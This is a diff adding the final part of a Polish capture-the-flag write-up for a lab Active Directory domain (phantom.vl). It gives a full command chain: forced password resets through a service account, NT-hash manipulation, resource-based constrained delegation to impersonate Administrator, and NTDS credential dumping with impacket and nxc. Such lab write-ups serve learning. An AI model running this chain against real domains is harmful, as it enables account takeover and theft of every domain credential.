@@ -252,5 +252,45 @@ przy okazji
 
 ![{B441CF78-0F98-46C3-9B05-E4F58D0ECAD2}](https://github.com/user-attachments/assets/4e97a5ff-8867-458f-a5dd-89a4b88349eb)
 
-wygląda nietrudno
+wygląda okey, ale szukamy dalej.
 
+![{543C6B38-8093-4443-9C9D-6129EC402051}](https://github.com/user-attachments/assets/e2777624-b700-4f76-8509-fe73f9c46bad)
+
+o mamy zwycięzce
+
+```
+net rpc password 'crose' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
+net rpc password 'wsilva' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
+net rpc password 'rnichols' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
+```
+
+dobra użyjmy tego uprawnienia wyżej.
+```
+nxc ldap phantom.vl -u svc_sspr -p '<hehe nope>' -M maq
+```
+
+![{4E481891-9DD2-484E-9DA1-6B008F2F0308}](https://github.com/user-attachments/assets/7f93e244-bc43-4dac-bc10-428e548fe567)
+
+P@ssw0rd -> e19ccf75ee54e06b06a5907af13cef42
+
+```
+impacket-getTGT -hashes :e19ccf75ee54e06b06a5907af13cef42 phantom.vl/crose
+python3 smbpasswd.py -newhashes :3af23a7ed7f626d6be9ad455ebf89256 phantom.vl/crose:'P@ssw0rd'@dc.phantom.vl
+impacket-rbcd -delegate-from 'crose' -delegate-to 'DC$' -dc-ip 10.10.92.153 -action 'write' 'phantom.vl'/'crose' -hashes :3af23a7ed7f626d6be9ad455ebf89256
+export KRB5CCNAME=crose.ccache
+impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'crose'
+export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
+impacket-secretsdump -k dc.phantom.vl
+```
+
+![{CEED6969-39A4-4286-AD17-8040FA3F360E}](https://github.com/user-attachments/assets/d2359cea-d4f4-4ad6-a742-39fa35bb1559)
+
+co ciekawe dalo mi to hash `Administrator`'a, który nie działa.
+SPróbowałem innej metody i dostałem inny hash. Ten działa
+```
+nxc smb 10.10.92.153 --use-kcache --ntds
+```
+
+![{CE9A5811-1480-421E-A969-5AAB5E1B848C}](https://github.com/user-attachments/assets/692fb59d-751d-4615-8a61-f9c14522d670)
+
+FINISH
